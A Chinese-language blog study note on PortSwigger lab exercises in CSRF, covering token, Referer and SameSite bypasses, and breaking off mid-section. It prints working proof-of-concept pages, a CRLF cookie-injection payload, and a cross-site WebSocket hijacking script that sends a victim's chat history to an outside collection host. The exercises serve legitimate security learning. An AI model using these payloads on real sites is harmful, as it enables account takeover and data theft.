---
title: 'csrf学习笔记'
published: 2026-04-25
description: 'PortswiggerLabs-CSRF'
tags: [Security]
category: note
draft: false
---

# CSRF（Cross-Site Request Forgery，跨站请求伪造）

**盗用用户当前已登录身份，诱导用户在不知情的情况下，向目标网站发起请求执行操作**。

Site = 协议 + 注册域

```
https://0aaa00710478468f80bee9eb004900f4.web-security-academy.net/login
└─┬─┘  └──────────────────────────┬─────────────────────────────────┘ └─┬─┘
协议                            主机名（host）                        路径

主机名再拆：  0aaa00710478468f80bee9eb004900f4 . web-security-academy . net
              └────────┬────────┘                 └────────┬────────┘└──┬──┘
                  子域（随便起）                      注册域（eTLD+1）──┘
```

**核心条件（缺一不可）：**

1. 用户已经登录目标网站，浏览器存有有效 Cookie / 会话凭证；
2. 目标网站没有校验请求是否来自可信页面；
3. 诱骗用户访问攻击者构造的恶意页面。

> eg：我登录了网银没关，攻击者给我发一张图片，点开图片时自动悄悄帮我发起转账请求，浏览器自动带上我的 Cookie。

**原理流程：**

1. 用户登录 A 网站，Cookie 保存在浏览器；
2. 用户访问攻击者的B 网站；
3. B 页面里藏着自动请求（img、form、js），请求 A 网站的接口；
4. 浏览器发起请求时自动带上 A 网站 Cookie；
5. A 网站收到带 Cookie 的请求，认为是用户本人操作，执行请求。

**和 XSS 的区别：**

- **CSRF**：利用浏览器自动携带 Cookie，**不能读取返回内容**，只能发起请求；不需要注入代码到目标站点，重点是**伪造请求**。
- **XSS**：在目标站点执行 JS，可以读取 Cookie、窃取信息、发起请求，能力更强。

XSS 可以用来实现 CSRF 能做的所有操作，属于 “上位漏洞”；**但 XSS 利用门槛更高，需要能把 JS 注入到目标页面**。

**常见危害：**

- 修改账号密码、修改个人资料
- 发起交易、发帖、删除数据
- 后台执行管理操作

**防御方案：**

1. **CSRF Token（最常用）**：表单 / 接口附带随机 Token，服务端校验，攻击者页面拿不到 Token；
2. 校验请求来源：`Referer` / `Origin`（有局限性，可被绕过）；
3. 关键操作使用**二次验证**（短信、验证码）；
4. Cookie 设置 `SameSite=Strict/Lax`，限制跨站时携带 Cookie。



下面就开始打 RCE 的靶场了。本人是纯萌新，wp会写的比较详细，方便自己复习。

![image-20260926090941061](https://fastly.jsdelivr.net/gh/whyulooksad/image_bed@main/images/20260926090941250.png)

## 一、无防御措施的 CSRF 漏洞 ⭐

1. 登录给定的账号后进入一个 Update email 的页面，随便填个邮箱提交。

   Burp 里看这个请求：

   ![9321c2b4-29dc-469d-80b0-fcc3dda3bfae](https://fastly.jsdelivr.net/gh/whyulooksad/image_bed@main/images/20260925043846722.png)

​	仔细看：

​		1.浏览器发请求时自动带 Cookie → 只要让受害者的浏览器发出这条 POST 请求，Cookie 自动带上，服务器就认账。

​		2. 身份只靠 `Cookie: session=...` 识别，请求里没有 CSRF token 这种随机值 → 没有防 CSRF 的机制

​		3. 参数只有一个 `email`，值随便填 → 攻击者完全可预测、可构造这个请求

​	条件齐了，这个请求可以伪造。

2. 开始构造攻击页面：这个页面 Burp 里可以自动生成，但是要 pro 版的才可以。

   <img src="https://fastly.jsdelivr.net/gh/whyulooksad/image_bed@main/images/20260925052231736.png" alt="4a4a4d1c-f259-4afd-bb85-8bc6460a3667" style="zoom: 80%;" />

   我这里就手写学习学习。

![20ba42501136e22c0ecd19e66f61a545](https://fastly.jsdelivr.net/gh/whyulooksad/image_bed@main/images/20260925054729325.png)

Deliver to victim 后， 靶场的机器人受害者就会带着它自己的登录 Cookie 访问我的这个页面，然后邮箱被我偷偷篡改：

![349021aeac6c9ddf70ff9508f1956f0a](https://fastly.jsdelivr.net/gh/whyulooksad/image_bed@main/images/20260925054943890.png)

第一关是原理，后面的就都是基于漏洞的绕过了。

## 二、Token 验证依赖于请求方法的 CSRF 漏洞

上一关之所以能打通，是因为请求完全可预测。标准防御就是在请求里加一个**随机值（token）**：服务器会先在用户打开界面时把随机 token 发给用户的浏览器，用户提交请求的时候带回来，服务器校验。攻击者的恶意页面**跨站读不到这个 token** → 伪造不了请求。

这关的漏洞是：服务器只在收到 POST 时才校验 token；如果请求方法换成 GET，token 校验直接被跳过。而 GET 请求是浏览器最容易顺手发出的（加载图片就是 GET）……

1.  登录账号，发出修改邮箱的请求后，可以看到这次多了个  **CSRF token**。

![image-20260925070801804](https://fastly.jsdelivr.net/gh/whyulooksad/image_bed@main/images/20260925070801886.png)

2. 在 Repeater 里做实验：先将 Post请求中的 crsf 值随便改坏一位，send 后果然直接报错。说明服务器端确实存在 token 校验。

   将请求换成 Get 试试，发现无论是改坏还是直接删掉 crsf 值都是直接成功，说明 GET 请求根本不校验 token。

   ![image-20260925071507877](https://fastly.jsdelivr.net/gh/whyulooksad/image_bed@main/images/20260925071507970.png)

3. 现在开始组装Poc。怎么让受害者的浏览器自动发一个 GET 请求呢？很简单，用一张图片：用户点进来后，浏览器渲染页面时，看到`<img>` 就会立刻自动去请求这个 URL（加载图片 = GET 请求）。受害者已经登录，浏览器自动带上他的 Cookie。服务器收到这个 GET 请求后，跳过 Token校验 → 改邮箱成功。

   ![73d7e35e97134221abfe23c5d0f26606](https://fastly.jsdelivr.net/gh/whyulooksad/image_bed@main/images/20260925071654326.png)

## 三、Token 验证依赖于 Token 存在的 CSRF 漏洞

上一关的漏洞是只验了 POST。而这一关是：**如果请求里带了 csrf 参数 → 验证它，对不上就报错；没带 → 直接放行。**

所以Poc直接和第一关一样就行。

![image-20260925081012037](https://fastly.jsdelivr.net/gh/whyulooksad/image_bed@main/images/20260925081012143.png)

## 四、Token 未与用户 session 绑定的 CSRF 漏洞

这一关的漏洞是：服务器的检验没有将 crsf token 和 user session绑定，只要是它签发过的 token 它都认。所以即使是别人的 user session ＋ 我的 crsf token 也可以用过检验。

做下实验：先登 wiener 的账号拿一下 crsf token：

![image-20260925094001432](https://fastly.jsdelivr.net/gh/whyulooksad/image_bed@main/images/20260925094001591.png)

然后拿 carlos 的请求，发到Repeater，把 body 里的 csrf 值替换成第wiener的 crsf token 后 send：

![image-20260925094337068](https://fastly.jsdelivr.net/gh/whyulooksad/image_bed@main/images/20260925094337152.png)

还是成功发送了，确实没有和 用户session 绑定。

写PoC：

 ![806425ff2f0e685b0ce539ecf1e234cc](https://fastly.jsdelivr.net/gh/whyulooksad/image_bed@main/images/20260925094659574.png)

## 五、Token 与非会话 Cookie 绑定的 CSRF 漏洞 ⭐

先学两个新概念：

**CRLF 注入（种 cookie 的手段）：**搜索一个词，看 history 里这条请求的响应头：

```
GET /?search=test
...
Set-Cookie: LastSearchTerm=test
```

搜索词被原样塞进了 Set-Cookie 头。如果它不过滤**回车换行符**（`%0d%0a`），我就能"另起一行"伪造任意响应头——包括再塞一条 Set-Cookie。（eg. 构造payload：`/?search=test%0d%0aSet-Cookie:%20csrfKey=BBBB%3b%20SameSite=None`）（`%3b`=分号，`%20`=空格）。

**SameSite=None：**现代浏览器默认（Lax 策略）拒绝在跨站请求中种下普通 cookie——而 `<img>` 发起的请求就是跨站的。所以注入的 Set-Cookie 必须显式声明 `SameSite=None`，浏览器才肯收。



<img src="https://fastly.jsdelivr.net/gh/whyulooksad/image_bed@main/images/20260925105951027.png" alt="image-20260925105950897" style="zoom:80%;" />

可以看到这关的请求里 Cookie 这一行多了个 csrfKey。这关 csrf 确实和某个东西绑定了，但绑的是 csrfKey 这个 cookie，而不是服务器端的 session。cookie 是存在用户浏览器里、可以被影响的东西——而 token 必须绑在“攻击者动不了的东西”上。绑到 cookie 上就有隐患：如果我能**把受害者浏览器里的 csrfKey 换成我的**，那我手里的 csrf 就和他的 csrfKey 配上套了？

测下能不能用 CRLF 注入种 Cookie：搜索词原样进了响应头 ，有戏。

![image-20260925110316617](https://fastly.jsdelivr.net/gh/whyulooksad/image_bed@main/images/20260925110316715.png)

把请求行改成：`GET /?search=test%0d%0aFoo:%20bar HTTP/2`。看响应头，多出了一行 `Foo: bar` → 换行符没过滤，可以伪造任意响应头。

![image-20260925111833156](https://fastly.jsdelivr.net/gh/whyulooksad/image_bed@main/images/20260925111833257.png)

写Poc：

![image-20260925112649051](https://fastly.jsdelivr.net/gh/whyulooksad/image_bed@main/images/20260925112649133.png)

时序是这段Poc的精华：

```text
页面加载 → <img> 请求搜索URL → 响应把我的 csrfkey 种进受害者浏览器
        → 图片渲染失败(src里是网页不是图) → 触发 onerror → 自动提交表单
        → csrfKey 和 csrf 配套 → 邮箱被改
```

## 六、Cookie 中存在重复 Token 的 CSRF 漏洞

可以看到这关里 请求参数里的 csrf == Cookie 里的 csrf 。这叫 **double submit（双重提交）** 防御模式：服务器不记得自己签发过哪些 token，只检查请求参数里的 csrf 是否等于 Cookie 里的 csrf，相等就放行。

逻辑是：正常情况下，攻击者既读不到也改不了受害者浏览器里**别的网站的 cookie**，所以“参数和 cookie 能对上”就意味着请求来自正规页面。

但是我们已经知道了 CRLF 注入，只要服务器不过滤回车换行符（`%0d%0a`），就能伪造任意响应头。

![image-20260925115938536](https://fastly.jsdelivr.net/gh/whyulooksad/image_bed@main/images/20260925115938630.png)

这一关，因为服务器不记账，我们连真 token 都不需要，随便编一个就行！

![image-20260925120542917](https://fastly.jsdelivr.net/gh/whyulooksad/image_bed@main/images/20260925120543009.png)

写Poc：

![ab15575d78fde843e3bfb97d03e22d7d](https://fastly.jsdelivr.net/gh/whyulooksad/image_bed@main/images/20260925120559680.png)

## 七、通过方法覆盖绕过 SameSite Lax 限制 ⭐

前面所有攻击能成立，靠的是：**浏览器发请求时自动带上 Cookie**。SameSite 就是浏览器给这条规律加的“开关”，它是 Cookie 的一个属性，由服务器在 `Set-Cookie` 时声明、浏览器执行：

| 档位     | 规则                                           |
| -------- | ---------------------------------------------- |
| `Strict` | 跨站请求一律不带 Cookie                        |
| `Lax`    | 跨站请求不带 Cookie，**但“顶级 GET 导航”例外** |
| `None`   | 一直带                                         |

什么是顶级导航？**“用户亲自到访”**（浏览器地址栏都变了，明摆着是人在操作）区别于 img/iframe/表单提交 ： **“页面在后台遥控发请求”**（用户啥都没看见）。举几个例子：

| 行为                                    | 地址栏变吗 | 算顶级导航吗                               |
| --------------------------------------- | ---------- | ------------------------------------------ |
| 地址栏输入网址回车                      | 变         | ✅                                          |
| 点一个链接 `<a href>`                   | 变         | ✅                                          |
| `document.location = "网址"`（JS 跳转） | 变         | ✅                                          |
| `<img src="...">` 加载图片              | 不变       | ❌（只是页面内部请求资源）                  |
| `<iframe src>` 加载内嵌页               | 不变       | ❌（iframe 是页面里的“小窗口”，不是主窗口） |

**对 CSRF 的影响**：跨站表单自动提交（前几关的核心打法）是“跨站 POST”——在 Lax 下 Cookie 不带 → 服务器不知道你是谁 → 攻击凉了。2021 年起 Chrome 默认给没有 SameSite 的 Cookie 都按 Lax 处理，所以这是现代 CSRF 的最大拦路虎，绕过它就是一门新功夫。



1. 先看一下请求：body 里只有 emalil ，没有 CSRF token，所以只要能带上 Cookie，就能打通。Cookie 那一行没看到 SameSite，应该是默认 Lax。

   ![ba79a20a0f0fd25e6078da22586f909d](https://fastly.jsdelivr.net/gh/whyulooksad/image_bed@main/images/20260926030550948.png)

2. 现在要想办法让 Cookie 在跨站的时候带上。只有 “Lax对顶级 get 导航"这一条可以利用。先将请求直接改成 get 试试：发现行不通，和第二关不一样，接口只认 POST。

   ![image-20260926031112974](https://fastly.jsdelivr.net/gh/whyulooksad/image_bed@main/images/20260926031113192.png)

   还有一条路是：这套靶场后端是 Spring 框架，支持**方法覆盖**。所以只要请求里只要带上 `_method=POST` 参数，框架就把这个请求当作 POST  来处理，哪怕它外表是个 GET。试一下：请求果然被接受了。可以利用这点来骗 Lax 和 Spring 框架 了。

   ![image-20260926031453488](https://fastly.jsdelivr.net/gh/whyulooksad/image_bed@main/images/20260926031453578.png)

3. 写Poc。这里用`document.location` 而不是 `<img>` 或表单：必须制造“顶级 GET 导航”，Cookie 才会被 Lax 放行。_method参数来骗 Spring 框架。

   ![826eb755834601f9721866fb05c6b106](https://fastly.jsdelivr.net/gh/whyulooksad/image_bed@main/images/20260926031728441.png)

攻击链条：

```
exploit 页发起 document.location 跳转
    │  外表：一次顶级 GET 导航 → Lax 放行 Cookie 
    ▼
GET /my-account/change-email?email=...&_method=POST
    │  内核：_method=POST → 框架按 POST 处理 
    ▼
接口放行 → 受害者邮箱被改
```



## 八、通过客户端重定向绕过 SameSite Strict 限制 ⭐

1. 先踩踩点。这次显示声明了`SameSite=Strict`。Cookie 绝对不随任何跨站请求发送。（代价是体验差，从搜索引擎点进某网站会显示未登录，这也是 Chrome 后来把默认档位从 Strict 改成 Lax 的原因。）

   Strict 下，浏览器判断 Cookie 该不该带，看的是**当前这次请求是在哪个站的上下文里发起的**。如果是该 Cookie 所在的网站自己发送的请求，那 Cookie 就还是该带的带，因为请求根本就没跨站。

   所以思路变成：**我不能自己跳到接口，而是让目标站的某个页面替我跳**。这种“目标站上可以被利用来发起跳转/请求的功能”有个术语叫 **gadget（站内跳板）**。

   ![image-20260926041902082](https://fastly.jsdelivr.net/gh/whyulooksad/image_bed@main/images/20260926041902329.png)

​	依旧没设 CSRF Token，只要能带上 Cookie，就能打通。	![image-20260926043247162](https://fastly.jsdelivr.net/gh/whyulooksad/image_bed@main/images/20260926043247265.png)

​	这次这个修改邮箱的功能既有 POST 接口，又有 Get 接口。不需要用 `_method` 伪装了。

![8b001b48-ada0-47ad-987b-3711cb83b216](https://fastly.jsdelivr.net/gh/whyulooksad/image_bed@main/images/20260926043836619.png)

2. 套路踩点踩完了。现在找跳板。浏览器随便打开一篇博客文章，发一条评论。点击发送后会先跳转到 谢谢评论 的页面，几秒后自动跳回文章。找到加载谢谢评论页面的那条 Get 请求：

   看响应里的HTML，发现它引用了`/resources/js/commentConfirmationRedirect.js`。

   ![c82cfeea-3db8-4aee-b5b6-a5d2708c70f4](https://fastly.jsdelivr.net/gh/whyulooksad/image_bed@main/images/20260926044504479.png)

   再看`/resources/js/commentConfirmationRedirect.js`的响应：它拿 `postId` 拼出跳转地址

   ![0ea606ac-cba2-4b31-b4ba-0cc292cb6ccd](https://fastly.jsdelivr.net/gh/whyulooksad/image_bed@main/images/20260926045528597.png)

   浏览器直接访问试下：`/post/comment/confirmation?postId=foo`。会先进入到谢谢评论页面，几秒钟后返回404页面（正常的，因为 foo是瞎编的）→ **postId 完全控制跳转路径**。

   **最后试路径穿越：**`/post/comment/confirmation?postId=1/../../my-account`

   浏览器把 `/post/1/../..` 归一化成 `/`，最终落到账户页。

   ①`postId` 能控制 JS 的跳转目标 ② `../..` 能在拼接时“爬”出前缀目录，到达任意站内路径 ③ 这次跳转是目标站自己的 JS 发起的  

   →  跳板完全成立！我们可以带着 Cookie 到改邮箱接口。

3. 写 Poc：`/../..`：抵消 JS 拼的 `/post/` 前缀，回到根。

   ![image-20260926051032538](https://fastly.jsdelivr.net/gh/whyulooksad/image_bed@main/images/20260926051032594.png)

攻击链：

```text
exploit 页发起 document.location 跳转
    │  第一跳：跨站导航 → Strict 拦下 Cookie——无所谓，确认页不需要登录
    ▼
GET /post/comment/confirmation?postId=1/../../my-account/change-email?email=...%26submit=1
    │  确认页加载（浏览器已"身处"目标站）
    │  第二跳：页面自己的 JS 读 postId 发起跳转 = 站内发起 → Strict 放行 Cookie ✅
    ▼
浏览器归一化 /post/1/../.. → GET /my-account/change-email?email=...&submit=1
    │  接口直接接受 GET（无 token，无需 _method）
    ▼
受害者邮箱被改
```

## 九、通过同级域名绕过 SameSite Strict 限制⭐

先学点东西：

**WebSocket 与 CSWSH（跨站 WebSocket 劫持）：** 

- HTTP 是半双工的，只能一问一答，而 WebSocket 是全双工的，先握手建立一条长连接，之后双方可以随时互发消息。
- CSWSH 就是 **WebSocket 版的 CSRF**：如果握手只靠 Cookie 认身份、没有 token，恶意页面也能 `new WebSocket('wss://目标/chat')` → 浏览器自动带受害者 Cookie → 这条连接用的是受害者的身份，攻击者的页面却能收发消息。危险还在于 WebSocket 没有同源策略强制隔离——服务器若不校验请求的 Origin，谁都能连。

**Site 和 Origin :**

- **Origin（源）** = 协议 + 域名 + 端口，一个都不能差
- **Site（站）** = 协议 + “注册域”（主体部分，如 `web-security-academy.net`）

**而SameSite 判断的是 Site，不是 Origin！**

```
0a8f...web-security-academy.net        ← 主站
cms-0a8f...web-security-academy.net    ← 兄弟域（cms 后台）

Origin 不同（主机名不同）  
Site 相同（同属 web-security-academy.net） 
→ Strict 管"跨 Site"，兄弟域之间发请求 = 同 Site → Cookie 照带！
```

这就是“同级域名”绕过的全部秘密：**SameSite 的墙在 Site 层，兄弟域是墙内的自己人**。



1. 先踩点确定些信息。Live chat 里随便发几条消息，找到最近的一条 `GET/chat`请求看一下：

   - Request 面板：请求头里没有任何 token，只有浏览器自动带的 Cookie
   - Response 面板：状态行是 `101 Switching Protocol`——这就是 WebSocket 握手成功

   ![image-20260926072344088](https://fastly.jsdelivr.net/gh/whyulooksad/image_bed@main/images/20260926072344292.png)

   再看下 WebSocket 里收发的消息：

   - 浏览器 → 服务器方向：内容是 **`READY`**
   - 服务器 → 浏览器方向：内容是刚刚在 Live chat 发的消息。

   ![image-20260926072455496](https://fastly.jsdelivr.net/gh/whyulooksad/image_bed@main/images/20260926072455613.png)

   ![image-20260926072528496](https://fastly.jsdelivr.net/gh/whyulooksad/image_bed@main/images/20260926072528569.png)

2.  确认一下 CSWSH 是否可行。这里需要用到 Burp 的Collaborator（外带信箱）: 聊天记录会到达 受害者浏览器里 的攻击脚本手上，但我们人在 Burp 这头，够不着，所以我们就需要一个信箱，脚本里用 fecth 把每条消息记录都 push 到信箱中，这样我们就能拿到了。先领一下信箱地址：`qe81kdpzt9jckz75el906xuneek583ws.oastify.com`。

   然后写攻击脚本：

   ```
   <script>
     //以当前访问者（受害者）的身份连上聊天
     var ws = new WebSocket('wss://0aaa00710478468f80bee9eb004900f4.web-security-academy.net/chat');
     // 连上就喊暗号，让服务器发送消息
     ws.onopen = function() { ws.send("READY"); };
     // 服务器每发来一条消息，就执行一次里面的代码
     ws.onmessage = function(event) {
     	// 把这条消息的内容 POST 寄到我的 Collaborator 信箱
       fetch('https://qe81kdpzt9jckz75el906xuneek583ws.oastify.com', {method:'POST', mode:'no-cors', body: event.data});
     };
   </script>
   ```

   ![6190445ce67a522637c4d57e3bd2b3b9](https://fastly.jsdelivr.net/gh/whyulooksad/image_bed@main/images/20260926074410483.png)

   看下信箱收到的：CSWSH 通道成立。脚本能以“浏览器代发”的方式连上聊天并拿到消息。因为我们的脚本是跨站的， Strict 在拦 Cookie，所以拿不到老会话，信箱里的是个新会话的开场白。

   ​	![image-20260926075631546](https://fastly.jsdelivr.net/gh/whyulooksad/image_bed@main/images/20260926075631642.png)

3. 我们知道 SamSite的墙只在 Site 层而没到 域层，所以现在得向办法找到主站的兄弟域。这里可能因为是做题的缘故，靶场自己提供了一个cms兄弟域。

   ![6ff4a044-753e-41ec-80b7-0e80851d7f1c](https://fastly.jsdelivr.net/gh/whyulooksad/image_bed@main/images/20260926080810247.png)

   点进去是个登录的表单，或许可以帮助我们进行 XSS。

   ![image-20260926080948948](https://fastly.jsdelivr.net/gh/whyulooksad/image_bed@main/images/20260926080949054.png)

   username 换成：`<script>alert(1)</script>`试一下，果然。可以进行反射型 XSS。

   ![image-20260926081124698](https://fastly.jsdelivr.net/gh/whyulooksad/image_bed@main/images/20260926081124782.png)

   找到刚刚那条 `POST /login` ，改成 GET 方法 发送（因为要用 xss，得从 url 里传参）

   ![de3fba72-39d9-4791-b7ce-a2fa0c2b4c3c](https://fastly.jsdelivr.net/gh/whyulooksad/image_bed@main/images/20260926082121804.png)

   成功了，这个 payload 可以塞在 URL 里让浏览器 导航过去 触发。

4. 组装攻击链：先将 CSWSH 脚本整体进行URL 编码：

   ![135604f0-d503-4b76-a3f7-646b703bae76](https://fastly.jsdelivr.net/gh/whyulooksad/image_bed@main/images/20260926082719876.png)

   得到：

   ```
   %3c%73%63%72%69%70%74%3e%0a%20%20%76%61%72%20%77%73%20%3d%20%6e%65%77%20%57%65%62%53%6f%63%6b%65%74%28%27%77%73%73%3a%2f%2f%30%61%61%61%30%30%37%31%30%34%37%38%34%36%38%66%38%30%62%65%65%39%65%62%30%30%34%39%30%30%66%34%2e%77%65%62%2d%73%65%63%75%72%69%74%79%2d%61%63%61%64%65%6d%79%2e%6e%65%74%2f%63%68%61%74%27%29%3b%0a%20%20%77%73%2e%6f%6e%6f%70%65%6e%20%3d%20%66%75%6e%63%74%69%6f%6e%28%29%20%7b%20%77%73%2e%73%65%6e%64%28%22%52%45%41%44%59%22%29%3b%20%7d%3b%0a%20%20%77%73%2e%6f%6e%6d%65%73%73%61%67%65%20%3d%20%66%75%6e%63%74%69%6f%6e%28%65%76%65%6e%74%29%20%7b%0a%20%20%20%20%66%65%74%63%68%28%27%68%74%74%70%73%3a%2f%2f%71%65%38%31%6b%64%70%7a%74%39%6a%63%6b%7a%37%35%65%6c%39%30%36%78%75%6e%65%65%6b%35%38%33%77%73%2e%6f%61%73%74%69%66%79%2e%63%6f%6d%27%2c%20%7b%6d%65%74%68%6f%64%3a%27%50%4f%53%54%27%2c%20%6d%6f%64%65%3a%27%6e%6f%2d%63%6f%72%73%27%2c%20%62%6f%64%79%3a%20%65%76%65%6e%74%2e%64%61%74%61%7d%29%3b%0a%20%20%7d%3b%0a%3c%2f%73%63%72%69%70%74%3e
   ```

   写最终Poc：

   ```
   <script>
     document.location = "https://cms-0aaa00710478468f80bee9eb004900f4.web-security-academy.net/login?username=%3c%73%63%72%69%70%74%3e%0a%20%20%76%61%72%20%77%73%20%3d%20%6e%65%77%20%57%65%62%53%6f%63%6b%65%74%28%27%77%73%73%3a%2f%2f%30%61%61%61%30%30%37%31%30%34%37%38%34%36%38%66%38%30%62%65%65%39%65%62%30%30%34%39%30%30%66%34%2e%77%65%62%2d%73%65%63%75%72%69%74%79%2d%61%63%61%64%65%6d%79%2e%6e%65%74%2f%63%68%61%74%27%29%3b%0a%20%20%77%73%2e%6f%6e%6f%70%65%6e%20%3d%20%66%75%6e%63%74%69%6f%6e%28%29%20%7b%20%77%73%2e%73%65%6e%64%28%22%52%45%41%44%59%22%29%3b%20%7d%3b%0a%20%20%77%73%2e%6f%6e%6d%65%73%73%61%67%65%20%3d%20%66%75%6e%63%74%69%6f%6e%28%65%76%65%6e%74%29%20%7b%0a%20%20%20%20%66%65%74%63%68%28%27%68%74%74%70%73%3a%2f%2f%71%65%38%31%6b%64%70%7a%74%39%6a%63%6b%7a%37%35%65%6c%39%30%36%78%75%6e%65%65%6b%35%38%33%77%73%2e%6f%61%73%74%69%66%79%2e%63%6f%6d%27%2c%20%7b%6d%65%74%68%6f%64%3a%27%50%4f%53%54%27%2c%20%6d%6f%64%65%3a%27%6e%6f%2d%63%6f%72%73%27%2c%20%62%6f%64%79%3a%20%65%76%65%6e%74%2e%64%61%74%61%7d%29%3b%0a%20%20%7d%3b%0a%3c%2f%73%63%72%69%70%74%3e&password=whyulooksadisabighacker!";
   </script>
   ```

   ![image-20260926083112532](https://fastly.jsdelivr.net/gh/whyulooksad/image_bed@main/images/20260926083112642.png)

   信箱里拿到了受害者的聊天记录：下面这个是他的账号和重置后的密码。

   ![image-20260926083258225](https://fastly.jsdelivr.net/gh/whyulooksad/image_bed@main/images/20260926083258365.png)

   我们去登录一下他的账号。登录成功这关就打完了。

   ![image-20260926083550576](https://fastly.jsdelivr.net/gh/whyulooksad/image_bed@main/images/20260926083550688.png)

这关的攻击链：

```
① 受害者被诱导打开 exploit 页，
    │  跨站，无 Cookie 需求，页面只有一句 document.location
    ▼
② 浏览器导航到 cms 兄弟域：
   https://cms-xxx.../login?username=<URL编码的CSWSH脚本>&password=x
    │  第一跳：跨站导航——被拦 Cookie 也无所谓，cms 登录页不需要登录
    ▼
③ cms 登录页渲染 "Invalid username: <script>…</script>"（反射 XSS，无过滤）
    │  内核①：脚本此刻跑在 cms-xxx.web-security-academy.net 上
    │        与主站同属一个 Site → SameSite=Strict 管不着它
    ▼
④ XSS 执行 new WebSocket('wss://主站/chat')
    │  内核②：同 Site 发起 → 浏览器自动带上 session Cookie ✅
    │  而握手接口无 token、不校验 Origin → CSWSH 成立
    ▼
⑤ 脚本发送 "READY" → 服务器回传该会话的全部聊天历史
    │  （受害者的会话里躺着明文账密）
    ▼
⑥ 每条消息经 fetch POST 外带到 Collaborator 信箱
    │  数据从受害者浏览器里"寄"出来
    ▼
⑦ 攻击者查收 → carlos / 密码 → 登录主站 → 通关 ✅
```

这关太难了，再写个分析链：

```
  全面踩点：枚举所有功能面
    │  主站有哪些东西？博客、登录、live chat、静态资源...
    │  原则：一个功能都不放过（靶场提示原话：fully audit all attack surface）
    ▼
  锁定敏感功能：live chat
    │  随便问几个问题
    │  抓 GET /chat 握手 → 无 token，只靠 Cookie
    │  检查防御：Cookie 的 SameSite 属性是什么？响应头看到 SameSite=Strict → 跨站发起=Cookie 必拦
    │  正门焊死了 → 换问题："有没有办法让请求'看起来'是站内发起的？"
    │  → "WebSocket 版 CSRF"的候选（CSWSH）、gadget（站内跳板)也可以候选
    ▼
  追问 Site 的边界：同一个 Site 里还有谁？
    │  翻静态资源的响应头 → Access-Control-Allow-Origin 泄露 cms-xxx
    │  关键认知：Site 看注册域，cms-xxx 与主站同 Site = Strict 管不到
    ▼
⑤  审计兄弟域：cms 上有什么可用的？
    │  登录表单 → username 原样回显 → 注 <script>alert(1)</script> 弹窗
    │  → 同 Site 域上的代码执行点到手
    ▼
⑥  组合：两块拼图一对上
    │  cms（同 Site）+ XSS（代码执行）= 可以"从墙内"发起 WebSocket
    │  受害者的 Cookie 会跟着走 → CSWSH 复活
    ▼
⑦  解决"数据怎么回到我手上"
    │  聊天历史落在受害者浏览器里，我够不着 → 需要外带信道
    │  → Collaborator / webhook.site，脚本里 fetch POST
    ▼
⑧  逐环验证 → 打包成 URL → 自测 → 交付
    │  先拿自己当靶子确认全链通，再丢给受害者
    ▼
⑨  收割：信箱里翻账密 → 登录 → 通关
```

太难了啊

## 十、Referer 验证依赖于请求头存在的 CSRF 漏洞

先学点东西：**Referer = 浏览器自动附带的“我从哪个页面发起的这个请求”**。比如我从 My account 页面点提交，Referer 就是那个页面；从 exploit server 页面发请求，Referer 就会暴露攻击者域名。

由此服务器就想到一个便宜的 CSRF 防御：**检查 Referer 是不是自己家的域名**，不是就拒绝。

这关的漏洞和第三关一个模子：有 Referer 头 → 检查它；没 Referer 头 → 放行。我觉得现实中不可能有这么蠢的开发者。

Poc：

```
<html>
  <meta name="referrer" content="no-referrer">
  <body>
    <form action="https://0a8300ac04fb87fa81365c2100c900b9.web-security-academy.net/my-account/change-email" method="POST">
      <input type="hidden" name="email" value="hacker@evil.com">
    </form>
    <script>document.forms[0].submit();</script>
  </body>
</html>
```

![image-20260926090732805](https://fastly.jsdelivr.net/gh/whyulooksad/image_bed@main/images/20260926090733067.png)

## 十一、Referer 验证缺陷导致的 CSRF 漏洞

这关的网站服务器也是**检查 Referer 是不是自己家的域名**，不是就拒绝。

但这关的校验逻辑是：**Referer 字符串里“包含”主站域名没有？**——只要域名这串字符出现在 Referer 的任何位置，就放行。

正确的校验逻辑应该是“Referer 的**来源域**必须等于主站”（从前往后解析判断）。而它做成了**全文包含匹配**——这是经典的校验缺陷：`https://evil.com/?xxx=主站域名` 也能通过。

先学习下 **history.pushState**（把主站域名“种”进 Referer）：Referer 是**浏览器自动填的**（= 发起请求的页面 URL），exploit 页的 URL 是 `https://exploit-xxx.exploit-server.net/`，我们改不了域名。但浏览器有个 JS API——`history.pushState(参数1, 参数2, 新URL)`：**不刷新页面，直接把当前页面的 URL 改成新 URL**（地址栏会变）。(第三个参数可以填相对 URL或者绝对 URL，填相对的话就是拼接，绝对就是覆盖。但填的绝对路径必须和当前页面同源才行，不然会报安全错误。所以一般都是用相对 ) 于是：

```
exploit 页先执行: history.pushState("", "", "/?主站域名")
    → 地址栏变成 https://exploit-xxx.exploit-server.net/?主站域名
    → 页面 URL 里包含了主站域名这串字符
    → 再提交表单，浏览器填的 Referer 就是这个改过的 URL
    → 服务器一查：包含主站域名 ✅ 放行
```

写Poc：

```
<html>
  <body>
    <form action="https://0a33002d03c6dff68025175b006c0056.web-security-academy.net/my-account/change-email" method="POST">
      <input type="hidden" name="email" value="hacker@evil.com">
    </form>
    <script>
      history.pushState("", "", "/?0a33002d03c6dff68025175b006c0056.web-security-academy.net");
      document.forms[0].submit();
    </script>
  </body>
</html>
```

![image-20260926102554101](https://fastly.jsdelivr.net/gh/whyulooksad/image_bed@main/images/20260926102554261.png)

这题有个小坑点：现代浏览器默认会把 Referer 的**查询串部分掐掉**（安全策略：只发源，不发完整 URL）——这样我们种的域名就被剪没了。解法就是让 exploit 页的**响应头**声明 `Referrer-Policy: unsafe-url`，命令浏览器“Referer 给我发完整 URL，查询串也带上”。

![image-20260926103157721](https://fastly.jsdelivr.net/gh/whyulooksad/image_bed@main/images/20260926103157835.png)

还有要注意的点可以了解一下原因，挺有意思的：1990 年代写 HTTP 规范文档时，作者手滑打成了 `Referer`（少了一个 r）。等大家发现的时候，全世界的浏览器、服务器都已经照着错的实现了——改了就等于破坏所有现存系统。于是委员会决定将错就错，错误拼写成为正式标准，一错三十年。于是现在的 Referer这个的拼写就很不统一。

| 出现位置                                     | 拼法                     | 对/错                        |
| -------------------------------------------- | ------------------------ | ---------------------------- |
| HTTP **请求头**（浏览器→服务器，“我从哪来”） | `Referer`                | ❌ 历史错拼，但**必须这么写** |
| HTTP **响应头**（2014 年才定的新头）         | `Referrer-Policy`        | ✅ 正确拼写                   |
| HTML 标签（上一关用的）                      | `<meta name="referrer">` | ✅ 正确拼写                   |
| JS 属性                                      | `document.referrer`      | ✅ 正确拼写                   |

总结先这题的攻击链：

```
① exploit 页响应带 Referrer-Policy: unsafe-url
    ▼
